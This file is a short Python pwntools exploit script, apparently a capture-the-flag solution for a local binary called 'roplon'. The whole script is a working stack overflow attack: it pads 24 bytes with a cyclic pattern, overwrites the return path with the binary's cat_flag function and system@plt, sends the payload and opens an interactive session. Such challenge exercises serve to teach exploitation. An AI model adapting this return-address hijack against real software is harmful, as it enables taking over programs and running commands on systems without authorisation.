from pwn import *

pp = process("./roplon")
elf = context.binary = ELF("./roplon")

offset = 24
payload = flat(
        cyclic(offset),
        elf.symbols.cat_flag,
        elf.plt.system
        )
pp.recv()
pp.sendline(payload)
pp.interactive()
